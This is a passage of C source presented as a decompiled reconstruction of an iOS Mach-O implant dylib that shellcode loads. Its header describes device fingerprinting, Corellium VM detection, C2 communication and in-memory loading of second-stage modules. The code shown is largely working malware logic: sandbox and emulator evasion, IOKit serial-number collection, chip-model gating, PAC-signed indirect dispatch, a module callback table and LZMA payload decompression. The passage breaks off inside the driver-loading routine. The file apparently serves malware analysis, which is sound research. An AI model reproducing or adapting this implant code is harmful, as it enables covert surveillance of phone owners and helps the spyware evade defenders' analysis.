/*
 * macho_source.c — Complete reconstructed source of the Mach-O dylib implant
 * Original: final_payload_A_16434916_macho.bin (MH_DYLIB, ARM64)
 *
 * Linked frameworks: UIKit, CoreFoundation, SystemConfiguration, CFNetwork
 * Linked libraries: libcompression, libobjc.A, libSystem.B
 *
 * Total functions: 70 (user code) + 88 stubs + 6 objc stubs = 164
 * Decompiled: 165 of 167 (2 ASM-only: sub_7720, sub_A294)
 *
 * This dylib is loaded by the shellcode via dlopen. It:
 *   1. Fingerprints the device (OS version, serial number, model, sandbox)
 *   2. Detects Corellium VMs
 *   3. Communicates with a C2 server over HTTPS (JSON protocol)
 *   4. Loads and executes a second-stage dylib from memory
 *   5. Uses ChaCha20 for encrypted communications
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <pthread.h>
#include <signal.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <sandbox.h>
#include <compression.h>
#include <objc/objc.h>
#include <objc/message.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CFNetwork/CFNetwork.h>
#include <SystemConfiguration/SystemConfiguration.h>

/* ═══════════════════════════════════════════════════════════════════════
 *  Forward declarations
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t  dispatch_call(int64_t a1, int64_t a2, int64_t a3);     // sub_B0FC
static void     pac_sign_func_ptr(void);                                // sub_B15C
static void     pac_sign_data_ptr(void);                                // sub_B198
static void     pac_sign_block(int64_t val, uint64_t ctx);             // sub_B1D4
static void     pac_verify(void);                                       // sub_B210

static int32_t  load_dylib_from_memory(int64_t ctx, int64_t macho,
                    int flags, uint32_t *entry_out, ...);               // sub_5FEC
static int32_t  exploit_entry(int64_t ctx);                             // sub_6C44
static int32_t  process_main(int64_t ctx, ...);                         // _process

static int32_t  check_chip_model_a(uint8_t *out);                      // sub_7524
static int32_t  check_chip_model_b(char *out);                         // sub_7638
static int64_t  is_virtual_device(int64_t ctx);                        // sub_9B60
static uint32_t get_hw_capability_flags(int64_t ctx);                  // sub_AB8C
static int32_t  parse_callback_table(int64_t ctx, int flags,
                    uint32_t *data, uint32_t data_size);                // sub_7C9C
static int32_t  load_all_callbacks(int64_t ctx);                       // sub_7E10
static int32_t  load_callback_by_id(int64_t ctx, int id);             // sub_7ED4
static int32_t  unload_callback(int64_t ctx, int id, int64_t a3);     // sub_7FC8
static int32_t  get_callback_address(int64_t ctx, int id, uint64_t *out); // sub_8080
static int32_t  query_callback_info(int64_t ctx, int id,
                    uint64_t *data, uint32_t *size);                    // sub_812C
static int32_t  init_callback_table(uint64_t *ctx);                    // sub_8210
static int32_t  prepare_environment(int64_t ctx);                      // sub_8298
static int32_t  decompress_lzma(uint8_t **data, uint32_t *size);       // sub_8430
static int32_t  load_driver(int64_t ctx, int64_t id, uint64_t *out);   // sub_8590
static int32_t  load_default_driver(int64_t ctx, uint64_t *out);       // sub_8798
static int32_t  driver_dispatch(int64_t drv, int64_t a2, int64_t a3);  // sub_87D8
static int32_t  driver_call(int64_t drv, int64_t a2, int64_t a3);     // sub_8840
static int32_t  driver_call_v2(int64_t drv, int64_t a2, int64_t a3);  // sub_88B4
static int32_t  release_driver(int64_t ctx, uint64_t *drv);           // sub_8928
static int32_t  check_sandbox_permissions(int64_t ctx, bool *out);     // sub_89CC
static int32_t  c2_poll_handler(int64_t ctx, char *url,
                    uint64_t body_len, uint64_t resp_max);              // sub_9300
static int32_t  c2_request_with_semaphore(int64_t ctx, const char *url,
                    const char *body, int64_t timeout,
                    uint64_t *out, uint32_t *out_len);                  // sub_987C
static int32_t  format_string(char **out, uint32_t *out_len,
                    const char *fmt, ...);                              // sub_9A34
static int32_t  build_c2_fingerprint(int64_t ctx, char *buf,
                    int buf_size, int64_t a4, int64_t a5, int64_t a6); // sub_9CB8
static int32_t  resolve_c2_url(int64_t ctx, int id, char *config,
                    uint32_t config_size, char *url_out,
                    size_t url_max, uint64_t *entry_out, ...);          // sub_9F18
static int32_t  c2_command_handler(int64_t ctx, int64_t a2,
                    int64_t a3, int64_t a4);                            // sub_A418
static int32_t  decrypt_and_process(int64_t ctx, uint8_t *key,
                    char flags, int64_t a4, uint64_t *out,
                    uint32_t *out_len, ...);                            // sub_AC44

/* ═══════════════════════════════════════════════════════════════════════
 *  Error codes
 * ═══════════════════════════════════════════════════════════════════════ */

#define ERR_INVALID_ARG     708609   /* 0xAD001 */
#define ERR_NOT_SUPPORTED   708616   /* 0xAD008 */
#define ERR_ALLOC_FAIL      708617   /* 0xAD009 */
#define ERR_DECOMPRESS      708619   /* 0xAD00B */
#define ERR_HTTP_URL        708628   /* 0xAD014 */
#define ERR_VM_DETECTED     708644   /* 0xAD024 */
#define ERR_POOL_FULL       49155    /* 0xC003  */
#define ERR_THREAD_INIT     118785   /* 0x1D001 */
#define ERR_THREAD_CREATE   118786   /* 0x1D002 */

#define CALLBACK_SLOT_SIZE  48
#define CALLBACK_SLOTS      24
#define CALLBACK_TABLE_OFF  320
#define CALLBACK_TABLE_SPAN (CALLBACK_SLOTS * CALLBACK_SLOT_SIZE) /* 1152 */

/* ═══════════════════════════════════════════════════════════════════════
 *  __x segment — PAC / dispatch infrastructure
 * ═══════════════════════════════════════════════════════════════════════
 *
 *  These 6 functions live in a special executable segment (__x) and
 *  handle pointer authentication + universal dispatch. The decompiler
 *  couldn't fully recover the PAC inline assembly, so the pseudocode
 *  appears as stubs. Their actual purpose is documented below.
 */

/* sub_B0F8 — 4-byte trampoline, falls through to dispatch_call */
static int64_t dispatch_call_entry(int64_t a1, int64_t a2, int64_t a3) {  // sub_B0F8
    return dispatch_call(a1, a2, a3);
}

/*
 * sub_B0FC — universal dispatch (109 callers!)
 * Reads a function pointer from the ctx struct, PAC-signs it,
 * then calls it with (a1, a2, a3). Used for every indirect call
 * throughout the implant.
 */
static int32_t dispatch_call(int64_t a1, int64_t a2, int64_t a3) {       // sub_B0FC
    /* Pseudocode is partially opaque due to PAC inline asm:
     *   if (&dword_0) { pac_sign_func_ptr(v0, 0); JUMPOUT(0); }
     *   return v0();
     * In reality: reads func ptr from ctx, PACIZA, BLR */
    (void)a1; (void)a2; (void)a3;
    return 0; /* placeholder — actual logic is PAC-protected indirect call */
}

/* sub_B15C — PAC-sign a function pointer (PACIA X0, X1) */
static void pac_sign_func_ptr(void) {                                     // sub_B15C
    /* __asm__ volatile("PACIA X0, X1"); */
}

/* sub_B198 — PAC-sign a data pointer (PACDA X0, X1) */
static void pac_sign_data_ptr(void) {                                     // sub_B198
    /* __asm__ volatile("PACDA X0, X1"); */
}

/* sub_B1D4 — PAC-sign an ObjC block ISA pointer */
static void pac_sign_block(int64_t val, uint64_t ctx) {                   // sub_B1D4
    (void)val; (void)ctx;
    /* __asm__ volatile("PACIA X0, X1"); */
}

/* sub_B210 — PAC-verify and strip (AUTIA + check) */
static void pac_verify(void) {                                            // sub_B210
    /* __asm__ volatile("AUTIA X0, X1; check"); */
}

/* ═══════════════════════════════════════════════════════════════════════
 *  PAC helpers (__text segment)
 * ═══════════════════════════════════════════════════════════════════════ */

/* sub_7BA0 — empty 8-byte stub (RET). Placeholder for pac_sign_pointer on non-PAC. */
static void pac_nop_sign(void) { }                                        // sub_7BA0

/* sub_7BA8 — empty stub */
static void pac_nop_2(void) { }                                           // sub_7BA8

/* sub_7BB0 — empty stub */
static void pac_nop_3(void) { }                                           // sub_7BB0

/* sub_7BB8 — empty stub */
static void pac_nop_4(void) { }                                           // sub_7BB8

/* sub_7BC0 — always returns 0 (PAC not available fallback) */
static int64_t is_pac_enabled(void) {                                     // sub_7BC0
    return 0;
}

static bool pac_check(void) {                                              // sub_5CEC
    return is_pac_enabled() != 0;
}

static void pac_strip(void) {                                              // sub_5D2C
    /* XPACLRI — strips PAC bits from LR. No-op in C. */
}

static uint64_t pac_sign_if_available(uint64_t ptr, uint64_t ctx) {        // sub_5D68
    if (is_pac_enabled())
        /* pac_sign_func_ptr() inlined — PACIA ptr, ctx */;
    return ptr;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Indirect call trampolines
 *  These set up stack frames for indirect calls via BR X0 (PAC-signed).
 * ═══════════════════════════════════════════════════════════════════════ */

/* sub_7BEC — simple indirect call: BR X0 */
static void trampoline_call(int64_t fn) {                                  // sub_7BEC
    ((void (*)(void))fn)();
}

/* sub_7C10 — store a2 to stack[a4], then BR X0 */
static void trampoline_store_call_a(int64_t fn, int a2,                    // sub_7C10
                                     int64_t a3, int64_t a4) {
    volatile uint8_t frame[32];
    *(uint32_t *)&frame[a4] = a2;
    ((void (*)(void))fn)();
}

/* sub_7C30 — same pattern, larger frame */
static void trampoline_store_call_b(int64_t fn, int a2,                    // sub_7C30
                                     int64_t a3, int64_t a4) {
    volatile uint8_t frame[48];
    *(uint32_t *)&frame[a4] = a2;
    ((void (*)(void))fn)();
}

/* sub_7C50 — same pattern */
static void trampoline_store_call_c(int64_t fn, int a2,                    // sub_7C50
                                     int64_t a3, int64_t a4) {
    volatile uint8_t frame[16];
    *(uint32_t *)&frame[a4] = a2;
    ((void (*)(void))fn)();
}

/* sub_7C78 — same pattern */
static void trampoline_store_call_d(int64_t fn, int a2,                    // sub_7C78
                                     int64_t a3, int64_t a4) {
    volatile uint8_t frame[32];
    *(uint32_t *)&frame[a4] = a2;
    ((void (*)(void))fn)();
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Cache maintenance
 * ═══════════════════════════════════════════════════════════════════════ */

#define CACHE_FLUSH_CHUNK  327680  /* 320 KB per flush */

extern void sys_dcache_flush(void *addr, size_t len);
extern void sys_icache_invalidate(void *addr, size_t len);

static void flush_code_cache(int64_t ctx, void *addr, uint32_t size) {     // sub_5DC8
    if (!addr || !size) {
        size = *(uint32_t *)(ctx + 144);
        if (!size) return;
        addr = *(void **)(ctx + 136);
    }
    uint32_t offset = 0;
    uint32_t remaining = size;
    do {
        size_t chunk = (remaining >= CACHE_FLUSH_CHUNK) ? CACHE_FLUSH_CHUNK : remaining;
        sys_dcache_flush((uint8_t *)addr + offset, chunk);
        sys_icache_invalidate((uint8_t *)addr + offset, chunk);
        offset += CACHE_FLUSH_CHUNK;
        remaining -= CACHE_FLUSH_CHUNK;
    } while (size > offset);
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Shared memory pool allocator (lock-free, atomic)
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t pool_alloc(int64_t ctx, uint32_t size) {                    // sub_5E78
    uint64_t pool_end = *(uint64_t *)(ctx + 136) + *(uint32_t *)(ctx + 144);
    uint32_t *alloc = *(uint32_t **)(ctx + 312);
    if (!alloc)
        alloc = (uint32_t *)(pool_end - 4);

retry:;
    uint32_t cur = __atomic_load_n(alloc, __ATOMIC_SEQ_CST);
    uint32_t next = cur + size + 4 * (cur == 0);
    if (next > *(uint32_t *)(ctx + 144))
        return ERR_POOL_FULL;

    if (!__atomic_compare_exchange_n(alloc, &cur, next, false,
                                     __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST))
        goto retry;

    void *ptr = (void *)(pool_end - next);
    *(void **)(ctx + 72) = ptr;
    *(uint32_t *)(ctx + 80) = size;
    bzero(ptr, size);

    if (*(void **)(ctx + 288))
        ((void (*)(int64_t, void *, uint32_t))(*(void **)(ctx + 288)))(ctx, ptr, size);

    return 0;
}

static void *pool_consume(int64_t ctx, uint64_t size) {                    // sub_5F4C
    if (*(uint32_t *)(ctx + 80) < size)
        return NULL;
    void *ptr = *(void **)(ctx + 72);
    *(void **)(ctx + 72) = (uint8_t *)ptr + size;
    *(uint32_t *)(ctx + 80) -= size;
    return ptr;
}

static int32_t secure_zero(int unused, void *buf, size_t len) {            // sub_5FA0
    (void)unused;
    if (buf && len)
        bzero(buf, len);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Plist reader (CoreFoundation)
 * ═══════════════════════════════════════════════════════════════════════ */

static CFPropertyListRef read_plist(const char *path) {                    // sub_7A98
    CFErrorRef error = NULL;
    size_t len = strlen(path);
    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        kCFAllocatorDefault, (const UInt8 *)path, len, false);
    if (!url) return NULL;

    CFReadStreamRef stream = CFReadStreamCreateWithFile(kCFAllocatorDefault, url);
    CFPropertyListRef plist = NULL;

    if (stream) {
        if (CFReadStreamOpen(stream)) {
            plist = CFPropertyListCreateWithStream(
                kCFAllocatorDefault, stream, 0, 0, NULL, &error);
            if (!plist && error)
                CFRelease(error);
            CFReadStreamClose(stream);
        }
        CFRelease(url);
        CFRelease(stream);
    } else {
        CFRelease(url);
    }
    return plist;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  OS version detection
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t get_os_version(int *version_out) {                         // sub_7090
    CFDictionaryRef dict = (CFDictionaryRef)read_plist(
        "/System/Cryptexes/OS/System/Library/CoreServices/SystemVersion.plist");
    if (!dict)
        dict = (CFDictionaryRef)read_plist(
            "/System/Library/CoreServices/SystemVersion.plist");
    if (!dict) return -1;

    CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault,
        "ProductVersion", kCFStringEncodingUTF8);
    if (!key) { CFRelease(dict); return -1; }

    CFStringRef val = (CFStringRef)CFDictionaryGetValue(dict, key);
    if (!val || CFGetTypeID(val) != CFStringGetTypeID()) {
        CFRelease(key); CFRelease(dict); return -1;
    }

    char buf[32];
    Boolean ok = CFStringGetCString(val, buf, 32, CFStringGetSystemEncoding());
    CFRelease(key);
    CFRelease(dict);
    if (!ok) return -1;

    int major = 0, minor = 0, patch = 0;
    if (sscanf(buf, "%d.%d.%d", &major, &minor, &patch) < 2)
        return -2;

    *version_out = (major << 16) | (minor << 8) | patch;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Anti-VM: Corellium detection + IOKit serial number
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t get_device_serial(uint8_t *output) {                       // sub_71FC
    if (!output) return -1;

    char serial_buf[64] = {0};
    struct stat st;

    if (stat("/usr/libexec/corelliumd", &st) == 0)
        return -1;

    if (sandbox_check(getpid(), "iokit-get-properties",
                      SANDBOX_CHECK_NO_REPORT) > 0)
        return -1;

    void *iokit = dlopen(
        "/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_LAZY);
    if (!iokit) return -1;

    uint32_t *p_master_port = (uint32_t *)dlsym(iokit, "kIOMasterPortDefault");
    uint64_t (*IORegistryEntryFromPath_fn)(uint32_t, const char *)
        = dlsym(iokit, "IORegistryEntryFromPath");
    uint64_t (*IORegistryEntryCreateCFProperty_fn)(uint64_t, CFStringRef, CFAllocatorRef, uint32_t)
        = dlsym(iokit, "IORegistryEntryCreateCFProperty");
    void (*IOObjectRelease_fn)(uint64_t)
        = dlsym(iokit, "IOObjectRelease");

    if (!IORegistryEntryFromPath_fn || !IORegistryEntryCreateCFProperty_fn
        || !IOObjectRelease_fn || !p_master_port)
    {
        dlclose(iokit);
        return -1;
    }

    uint64_t entry = IORegistryEntryFromPath_fn(*p_master_port, "IODeviceTree:/");
    if (!entry) { dlclose(iokit); return -1; }

    CFStringRef sn_key = CFStringCreateWithCString(kCFAllocatorDefault,
        "IOPlatformSerialNumber", kCFStringEncodingUTF8);
    if (!sn_key) { IOObjectRelease_fn(entry); dlclose(iokit); return -1; }

    CFStringRef sn_val = (CFStringRef)IORegistryEntryCreateCFProperty_fn(
        entry, sn_key, kCFAllocatorDefault, 0);
    int result = -1;

    if (sn_val && CFGetTypeID(sn_val) == CFStringGetTypeID()) {
        if (CFStringGetCString(sn_val, serial_buf, 64, kCFStringEncodingUTF8))
            result = 0;
        CFRelease(sn_val);
    }

    CFRelease(sn_key);
    IOObjectRelease_fn(entry);
    dlclose(iokit);

    if (result == 0)
        memcpy(output, serial_buf, 64);
    return result;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Hardware chip model checks
 *  These check the SoC chip ID read through PAC-stripped IOKit data.
 *  Constants like 458787762/458787763/1176831186/-2023363094/-634136515
 *  correspond to specific Apple SoC identifiers (A14, A15, A16, M1, M2).
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t check_chip_model_a(uint8_t *out) {                         // sub_7524
    if (!out) return -1;

    uint8_t serial_flag = 0;
    pac_strip();
    /* Read chip ID from IOKit registry via PAC-stripped pointer */
    /* (decompiler artifact: accesses through stru_68.segname offset) */
    int chip_id = 0; /* = *(int32_t*)(pac_stripped_ptr + 8) */

    bool need_serial = false;
    if (chip_id <= 458787762) {
        need_serial = (chip_id == -2023363094) || (chip_id == -634136515);
    } else {
        need_serial = (chip_id == 458787763) || (chip_id == 1176831186) || (chip_id == 678884789);
    }

    if (need_serial) {
        if (get_device_serial(&serial_flag))
            return 0xFFFFFFFD; /* 4294967293 */
    }
    *out = serial_flag;
    return 0;
}

static int32_t check_chip_model_b(char *out) {                            // sub_7638
    if (!out) return -1;

    pac_strip();
    int chip_id = 0; /* read via PAC-stripped IOKit pointer */

    char result = 0;
    if (chip_id == 131287967 || chip_id == -400654602) {
        uint8_t serial_flag = 1;
        if (get_device_serial(&serial_flag))
            return 0xFFFFFFFD;
        result = serial_flag;
    }
    *out = result;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Virtual device detection (hw.model + OS version)
 * ═══════════════════════════════════════════════════════════════════════ */

static int64_t is_virtual_device(int64_t ctx) {                           // sub_9B60
    if (!ctx) return 0;

    uint32_t osver = *(uint32_t *)(ctx + 192);

    if (osver > 0x1006FF) return 1;

    if (osver <= 0x100400) {
        if (osver - 984839 < 0xF8F9) return 1;

        if ((osver - 983552) >> 9 <= 0x7E) {
            char model[32] = {0};
            size_t model_len = 32;
            if (!sysctlbyname("hw.model", model, &model_len, NULL, 0)
                && (model[0] & 0xDF) == 'J')
            {
                return (uint64_t)(*(uint64_t *)(ctx + 1600) - 0x40000001ULL) >> 30 == 0;
            }
        }
        return 0;
    }

    /* osver > 0x100400 && osver <= 0x1006FF */
    int hw_model = *(int32_t *)(ctx + 224);
    if (hw_model > 458787762) {
        if (hw_model != 458787763 && hw_model != 1176831186) return 1;
    } else {
        if (hw_model != -2023363094 && hw_model != -634136515) return 1;
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Hardware capability flags (bitmask based on OS version)
 * ═══════════════════════════════════════════════════════════════════════ */

static uint32_t get_hw_capability_flags(int64_t ctx) {                    // sub_AB8C
    if (!ctx) return 0;

    if (is_virtual_device(ctx) & 1)
        return 0x900000;   /* 9437184 — virtual device */

    uint32_t osver = *(uint32_t *)(ctx + 192);

    if (osver > 0x100500)
        return 0x800000;

    if (osver >> 20) /* >= 16.x */
        return 0x700000;

    uint32_t flags;
    if (osver <= 0xDFFFF)
        flags = 0x300000;
    else
        flags = 0x400000;

    if (osver > 0xE04FF)
        flags = 0x700000;

    if (osver > 0xF0706)
        return 0x800000;

    return flags;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Callback / module table system
 *
 *  The ctx struct contains a table of 24 callback slots starting at
 *  offset 320. Each slot is 48 bytes:
 *    +0:  uint32_t callback_id
 *    +4:  uint32_t flags
 *    +8:  uint64_t data_ptr
 *    +16: uint32_t data_size
 *    +20: uint32_t reserved
 *    +24: uint64_t state_a (version/status)
 *    +32: uint32_t state_b
 *    +40: uint64_t loaded_ptr
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t parse_callback_table(int64_t ctx, int flags,               // sub_7C9C
                                     uint32_t *data, uint32_t data_size) {
    int64_t result = ERR_INVALID_ARG;
    if (!ctx || !data || !data_size)
        return result;

    if (data_size < 4)
        return 28676;

    /* Check magic: 0xF0120F0F == -267534609 */
    if (*data != 0xF0120F0F) {
        /* Unknown format */
        return 28676;
    }
    if (data_size < 9)
        return 28676;

    int32_t count = data[1];
    if (count < 1)
        return 0;

    for (int32_t i = 0; i < count; i++) {
        uint64_t entry_addr = (uint64_t)&data[4 * i + 2];
        if (entry_addr < (uint64_t)data || (uint64_t)data + data_size <= entry_addr)
            return 28677;

        int32_t id = *(int32_t *)entry_addr;
        if (!id) return 28684;

        uint32_t offset = *(uint32_t *)(entry_addr + 8);
        int32_t  size   = *(int32_t *)(entry_addr + 12);
        char    *ptr    = (char *)data + offset;

        /* Find or allocate slot */
        int64_t slot_off;
        for (slot_off = 0; slot_off < CALLBACK_TABLE_SPAN; slot_off += CALLBACK_SLOT_SIZE) {
            int32_t slot_id = *(int32_t *)(ctx + slot_off + CALLBACK_TABLE_OFF);
            if (!slot_id || slot_id == id) break;
        }
        if (slot_off >= CALLBACK_TABLE_SPAN)
            return 708617; /* table full */

        result = 0;
        int64_t slot = ctx + slot_off;
        /* Zero 48 bytes */
        memset((void *)(slot + CALLBACK_TABLE_OFF), 0, CALLBACK_SLOT_SIZE);
        /* Write entry */
        *(uint64_t *)(slot + CALLBACK_TABLE_OFF)     = *(uint64_t *)entry_addr; /* id + flags */
        *(uint64_t *)(slot + CALLBACK_TABLE_OFF + 8)  = (uint64_t)ptr;
        *(int32_t *)(slot + CALLBACK_TABLE_OFF + 16)  = size;
    }
    return result;
}

static int32_t load_all_callbacks(int64_t ctx) {                           // sub_7E10
    for (int64_t i = 0; i < CALLBACK_TABLE_SPAN; i += CALLBACK_SLOT_SIZE) {
        if (!*(int32_t *)(ctx + i + CALLBACK_TABLE_OFF))
            continue;
        if (!*(int32_t *)(ctx + i + CALLBACK_TABLE_OFF + 4))
            continue;
        if (*(uint64_t *)(ctx + i + CALLBACK_TABLE_OFF + 40))
            continue;

        int32_t err = dispatch_call(ctx,
            *(int64_t *)(ctx + i + CALLBACK_TABLE_OFF + 8),
            *(uint32_t *)(ctx + i + CALLBACK_TABLE_OFF + 16));
        if (err) return err;

        *(uint64_t *)(ctx + i + CALLBACK_TABLE_OFF + 40) = 0;
        *(uint64_t *)(ctx + i + CALLBACK_TABLE_OFF + 24) = 0x500000005LL;
        *(int32_t *)(ctx + i + CALLBACK_TABLE_OFF + 32)  = -2147482624; /* 0x80000200 */
    }
    return 0;
}

static int32_t load_callback_by_id(int64_t ctx, int id) {                 // sub_7ED4
    if (!ctx || !*(uint64_t *)(ctx + 48) || !id)
        return ERR_INVALID_ARG;

    int64_t slot_off;
    for (slot_off = 0; slot_off < CALLBACK_TABLE_SPAN; slot_off += CALLBACK_SLOT_SIZE) {
        if (*(int32_t *)(ctx + slot_off + CALLBACK_TABLE_OFF) == id) break;
    }
    if (slot_off >= CALLBACK_TABLE_SPAN) return 28675;

    int64_t slot = ctx + slot_off;
    if (*(uint64_t *)(slot + CALLBACK_TABLE_OFF + 40))
        return 28673;

    int64_t data_ptr = *(int64_t *)(slot + CALLBACK_TABLE_OFF + 8);
    uint32_t data_sz = *(uint32_t *)(slot + CALLBACK_TABLE_OFF + 16);
    if (!data_ptr || !data_sz)
        return 28674;

    int32_t err = dispatch_call(ctx, data_ptr, data_sz);
    if (err) return err;

    *(uint64_t *)(slot + CALLBACK_TABLE_OFF + 40) = 0;
    *(uint64_t *)(slot + CALLBACK_TABLE_OFF + 24) = 0x500000005LL;
    *(int32_t *)(slot + CALLBACK_TABLE_OFF + 32)  = -2147482624;
    return 0;
}

static int32_t unload_callback(int64_t ctx, int id, int64_t a3) {         // sub_7FC8
    if (!ctx || !*(uint64_t *)(ctx + 304) || !id)
        return ERR_INVALID_ARG;

    int64_t slot_off;
    for (slot_off = 0; slot_off < CALLBACK_TABLE_SPAN; slot_off += CALLBACK_SLOT_SIZE) {
        if (*(int32_t *)(ctx + slot_off + CALLBACK_TABLE_OFF) == id) break;
    }
    if (slot_off >= CALLBACK_TABLE_SPAN) return 28675;

    int64_t slot = ctx + slot_off;
    int64_t loaded = *(int64_t *)(slot + CALLBACK_TABLE_OFF + 40);
    if (loaded) {
        int32_t err = dispatch_call(ctx, loaded, a3);
        if (err) return err;
    }
    *(uint64_t *)(slot + CALLBACK_TABLE_OFF + 40) = 0;
    *(uint64_t *)(slot + CALLBACK_TABLE_OFF + 24) = 0;
    *(int32_t *)(slot + CALLBACK_TABLE_OFF + 32)  = 0;
    return 0;
}

static int32_t get_callback_address(int64_t ctx, int id,                   // sub_8080
                                     uint64_t *out) {
    if (!ctx || !out) return ERR_INVALID_ARG;
    *out = 0;
    if (!id) return ERR_INVALID_ARG;

    int64_t slot_off;
    for (slot_off = 0; slot_off < CALLBACK_TABLE_SPAN; slot_off += CALLBACK_SLOT_SIZE) {
        if (*(int32_t *)(ctx + slot_off + CALLBACK_TABLE_OFF) == id) break;
    }
    if (slot_off >= CALLBACK_TABLE_SPAN) return 28675;

    int64_t slot = ctx + slot_off;
    uint64_t loaded = *(uint64_t *)(slot + CALLBACK_TABLE_OFF + 40);
    if (!loaded) {
        int32_t err = load_callback_by_id(ctx, id);
        if (err) return err;
        loaded = *(uint64_t *)(slot + CALLBACK_TABLE_OFF + 40);
    }
    *out = loaded;
    return 0;
}

static int32_t query_callback_info(int64_t ctx, int id,                    // sub_812C
                                    uint64_t *data, uint32_t *size) {
    if (!ctx || !data || !size) return ERR_INVALID_ARG;
    *data = 0;
    *size = 0;
    if (!id) return ERR_INVALID_ARG;

    int64_t slot_off;
    for (slot_off = 0; slot_off < CALLBACK_TABLE_SPAN; slot_off += CALLBACK_SLOT_SIZE) {
        if (*(int32_t *)(ctx + slot_off + CALLBACK_TABLE_OFF) == id) break;
    }
    if (slot_off >= CALLBACK_TABLE_SPAN) return 28675;

    uint64_t ptr = *(uint64_t *)(ctx + slot_off + CALLBACK_TABLE_OFF + 8);
    uint32_t sz  = *(uint32_t *)(ctx + slot_off + CALLBACK_TABLE_OFF + 16);
    if (!ptr || !sz) return 28674;

    *data = ptr;
    *size = sz;
    return 0;
}

/*
 * sub_8210 — initializes callback table: zeros all 24 slots (offset 320–1472),
 * then installs default handler function pointers at ctx[29..34].
 */
static int32_t init_callback_table(uint64_t *ctx) {                       // sub_8210
    for (int64_t i = 40; i < 184; i += 6) {
        /* Zero 48 bytes per slot (6 uint64_t) */
        memset(&ctx[i], 0, 48);
    }
    ctx[29] = (uint64_t)parse_callback_table;
    ctx[30] = (uint64_t)load_all_callbacks;
    ctx[31] = (uint64_t)load_callback_by_id;
    ctx[32] = (uint64_t)unload_callback;
    ctx[33] = (uint64_t)get_callback_address;
    ctx[34] = (uint64_t)query_callback_info;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Environment setup (memory regions via vm_region/proc_pidinfo)
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t prepare_environment(int64_t ctx) {                         // sub_8298
    if (*(uint8_t *)(ctx + 1474) || *(uint8_t *)(ctx + 1477) || *(uint8_t *)(ctx + 1479))
        goto setup_done;

    if (*(uint32_t *)(ctx + 192) < 0xF0000) {
        /* Use vm_region_64 */
        vm_address_t address = *(uint64_t *)(ctx + 72);
        vm_size_t size = 0;
        mach_msg_type_number_t info_cnt = 9;
        int buffer[20];
        mach_port_t obj_name;

        kern_return_t kr = vm_region_64(mach_task_self(), &address, &size,
            9, (vm_region_info_t)buffer, &info_cnt, &obj_name);
        if (kr) return kr | 0x80000000;
    } else {
        /* Use proc_pidinfo */
        int buffer[24];
        pid_t pid = getpid();
        if (proc_pidinfo(pid, 7, *(uint64_t *)(ctx + 72), buffer, 96) <= 0)
            return 0x80000005; /* 2147483653 */
    }

    /* Additional memory region validation ... */
    *(uint64_t *)(ctx + 288) = (uint64_t)flush_code_cache;

    if (*(uint8_t *)(ctx + 1477) || *(uint8_t *)(ctx + 1479))
        return 0;

    *(uint32_t *)(ctx + 80) = 0;
    return 0;

setup_done:
    *(uint64_t *)(ctx + 288) = (uint64_t)flush_code_cache;
    if (*(uint8_t *)(ctx + 1477) || *(uint8_t *)(ctx + 1479))
        return 0;
    *(uint32_t *)(ctx + 80) = 0;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  LZMA decompression wrapper
 * ═══════════════════════════════════════════════════════════════════════ */

#define COMPRESS_MAGIC  200142861  /* 0x0BEEF00D */

static int32_t decompress_lzma(uint8_t **data, uint32_t *size) {          // sub_8430
    if (!data || !*data || !size) return ERR_INVALID_ARG;

    uint8_t *src = *data;
    uint32_t src_size = *size;
    if (!src_size) return ERR_INVALID_ARG;

    if (src_size < 8 || *(uint32_t *)src != COMPRESS_MAGIC)
        return 0; /* not compressed — no-op */

    uint32_t dst_size = ((uint32_t *)src)[1];
    if (!dst_size || (int)src_size - 8 >= (int)dst_size)
        return 0;

    uint8_t *dst = (uint8_t *)malloc(dst_size + 1);
    if (!dst) return ERR_ALLOC_FAIL;

    memset_s(dst, dst_size, 0, dst_size);

    if (compression_decode_buffer(dst, dst_size + 1,
            src + 8, src_size - 8, NULL, COMPRESSION_LZMA) == dst_size)
    {
        memset_s(src, src_size, 0, src_size);
        free(src);
        *data = dst;
        *size = dst_size;
        return 0;
    }

    memset_s(dst, dst_size, 0, dst_size);
    free(dst);
    return ERR_DECOMPRESS;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Driver module system
 *  A "driver" is a pair of pointers (image_base, vtable) loaded from
 *  the callback table. The vtable contains 8 function pointers that
 *  are PAC-signed after loading.
 * ═══════════════════════════════════════════════════════════════════════ */

static int32_t load_driver(int64_t ctx, int64_t id, uint64_t *out) {      // sub_8590
    int64_t header[2] = {0, 0};
    int32_t err = dispatch_call(ctx, id, (int64_t)header);
    if (err) return err;

    uint64_t *drv = (uint64_t *)malloc(16);
    if (!drv) return ERR_ALLOC_FAIL;

    err = dispatch_call(ctx, header[0], 0);
    if (err) goto fail;

    if (*(uint64_t *)(ctx + 288))
        dispatch_call(ctx, *(uint64_t *)(header[1] + 88),
